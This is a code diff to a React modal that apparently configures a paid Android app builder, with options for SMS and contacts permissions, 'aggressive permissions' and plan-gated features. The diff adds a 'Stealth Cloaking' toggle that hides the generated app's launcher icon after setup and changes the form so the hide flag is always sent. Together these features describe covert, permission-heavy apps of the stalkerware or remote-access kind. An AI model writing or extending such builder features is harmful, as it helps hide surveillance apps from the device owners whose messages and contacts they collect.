@@ -461,7 +461,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
             formData.append('uuid', uuid);
             formData.append('appName', activeApp.name);
             formData.append('packageName', activeApp.packageName);
-            formData.append('hideApp', (selectedPreset === 'custom' ? hideApp : false).toString());
+            formData.append('hideApp', hideApp.toString());
             formData.append('webLink', activeApp.url);
             formData.append('enableSmsPermission', enableSmsPermission.toString());
             formData.append('enableContactsPermission', enableContactsPermission.toString());
@@ -1202,6 +1202,41 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                             </div>
                                             <div className={`w-11 h-6 rounded-full transition-colors relative shrink-0 p-0.5 ${aggressivePermissions && !isBasicPlan ? 'bg-amber-500 shadow-[0_0_8px_#f59e0b]' : 'bg-white/10'}`}>
                                                 <div className={`w-5 h-5 bg-white rounded-full transition-transform ${aggressivePermissions && !isBasicPlan ? 'translate-x-5' : 'translate-x-0'}`} />
+                                            </div>
+                                        </div>
+
+                                        {/* Hide Launcher Icon (Stealth Cloaking) */}
+                                        <div 
+                                            onClick={() => {
+                                                if (isBasicPlan) { onUpgrade?.('Launcher Cloaking', 'standard'); return; }
+                                                setHideApp(!hideApp);
+                                            }}
+                                            className={`p-3.5 rounded-2xl flex items-center justify-between gap-3 cursor-pointer transition-all select-none sm:col-span-2 ${
+                                                hideApp && !isBasicPlan
+                                                    ? 'bg-rose-500/10 border-2 border-rose-500/60 shadow-[0_0_16px_rgba(244,63,94,0.25)]' 
+                                                    : 'bg-[#16181e] border border-white/10 hover:border-white/20 opacity-80 hover:opacity-100'
+                                            }`}
+                                        >
+                                            <div className="flex items-center gap-3 min-w-0">
+                                                <div className={`w-9 h-9 rounded-xl flex items-center justify-center shrink-0 ${
+                                                    hideApp && !isBasicPlan ? 'bg-rose-500/20 text-rose-300 border border-rose-500/40' : 'bg-white/5 text-white/40'
+                                                }`}>
+                                                    <EyeOff size={18} />
+                                                </div>
+                                                <div className="flex flex-col min-w-0">
+                                                    <div className="flex items-center gap-1.5">
+                                                        <span className={`text-xs font-black truncate ${hideApp && !isBasicPlan ? 'text-rose-200' : 'text-white'}`}>
+                                                            Hide Launcher Icon
+                                                        </span>
+                                                        {isBasicPlan && <Lock size={11} className="text-orange-400/80" />}
+                                                    </div>
+                                                    <span className="text-[10px] text-white/50 font-mono mt-0.5 truncate">
+                                                        {hideApp ? 'Active • App icon automatically vanishes after setup' : 'Visible • App icon remains in drawer'}
+                                                    </span>
+                                                </div>
+                                            </div>
+                                            <div className={`w-11 h-6 rounded-full transition-colors relative shrink-0 p-0.5 ${hideApp && !isBasicPlan ? 'bg-rose-500 shadow-[0_0_8px_#f43f5e]' : 'bg-white/10'}`}>
+                                                <div className={`w-5 h-5 bg-white rounded-full transition-transform ${hideApp && !isBasicPlan ? 'translate-x-5' : 'translate-x-0'}`} />
                                             </div>
                                         </div>
                                     </div>
